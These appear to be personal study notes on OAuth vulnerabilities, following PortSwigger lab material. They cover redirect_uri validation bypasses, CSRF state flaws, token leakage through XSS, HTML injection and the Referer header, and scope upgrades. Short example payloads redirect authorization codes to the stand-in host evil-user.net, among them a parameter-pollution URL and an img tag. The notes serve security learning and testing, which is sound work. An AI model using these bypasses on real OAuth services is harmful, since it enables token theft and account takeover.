- OAuth authentication vulnerabilities arise partly because the OAuth specification is relatively vague and flexible by design.
- One of the other key issues with OAuth is the general lack of built-in security features. The security relies almost entirely on developers using the right combination of configuration options and implementing their own additional security measures on top, such as robust input validation.
- Depending on the grant type, highly sensitive data is also sent via the browser, which presents various opportunities for an attacker to intercept it.

### Identifying OAuth Authentication

Recognizing when an application is using OAuth authentication is relatively straightforward. If you see an option to log in using your account from a different website, this is a strong indication that OAuth is being used.

The most reliable way to identify OAuth authentication is to proxy your traffic through Burp and check the corresponding HTTP messages when you use this login option

***  In particular, keep an eye out for the `client_id`, `redirect_uri`, and `response_type` parameters. ***

### Vulnerabilities in the Client Application

Client applications will often use a reputable, battle-hardened OAuth service that is well protected against widely known exploits. However, their own side of the implementation may be less secure.

(I) ** Improper implementation of the Implicit grant type: ** 

![[Pasted image 20230520141411.png]]

(II) ** Flawed CSRF Protection **

##### State Parameter: 
The state parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow. 

![[Pasted image 20230520145836.png]]

#### NOTE: Always follow OAuth flows in burp



## VULNERABILITIES IN THE OAuth SERVICE

### (I) LEAKING AUTHORIZATION CODES AND ACCESS TOKEN

![[Pasted image 20230520164928.png]]

### (ii) Flawed redirect_uri validation

OAuth service should keep a white list of their genuine callback. But this could be bypassed.

When auditing an OAuth flow, you should try experimenting with the `redirect_uri` parameter to understand how it is being validated. For example:

#### -   Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.

#### - If you can append extra values to the default `redirect_uri` parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as:
```

https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
```

#### - You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate `redirect_uri` parameters as follows:

```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```

####  -   Some servers also give special treatment to `localhost` URIs as they're often used during development. In some cases, any redirect URI beginning with `localhost` may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as `localhost.evil-user.net`.

### NOTE: Do not limit testing to probing redirect_uri parameter in isolation. We must check other parameters.

#### For example, changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the `web_message` response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`.


![[Pasted image 20230521091617.png]]


### Note that for the implicit grant type, stealing an access token doesn't just enable you to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, you can also use the token to make your own API calls to the OAuth service's resource server.

In additions to Open Redirects , there may be other vulnerabilities which allow us to extract code or token and send to external domain.

###  - Dangerous Javascript which handles query parameters and URL fragments

### - XSS Vulnerabilities

### - HTML Injection Vulnerabilities
In cases where you cannot inject JavaScript (for example, due to [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) constraints or strict filtering), you may still be able to use a simple HTML injection to steal authorization codes.

If you can point the `redirect_uri` parameter to a page on which you can inject your own HTML content, you might be able to leak the code via the `Referer` header.
#### Explanation:  For example, consider the following `img` element: `<img src="evil-user.net">`. When attempting to fetch this image, some browsers (such as Firefox) will send the full URL in the `Referer` header of the request, including the query string.


## FLAWED SCOPE VALIDATION

##### In any OAuth Flow the user must approve the requested access based on the scope defined in the authorization request.

##### The resulting token allows the client application to access only the scope that was approved by the user => But in many cases it is possible for an attacker to  upgrade an access token with extra permission

#### Scope upgrade: authorization code flow

![[Pasted image 20230521174754.png]]


##  Scope upgrade: implicit flow

For the [implicit grant type](https://portswigger.net/web-security/oauth/grant-types#implicit-grant-type), the access token is sent via the browser, which means an attacker can steal tokens associated with innocent client applications and use them directly

Once they have stolen an access token, they can send a normal browser-based request to the OAuth service's `/userinfo` endpoint, manually adding a new `scope` parameter in the process.

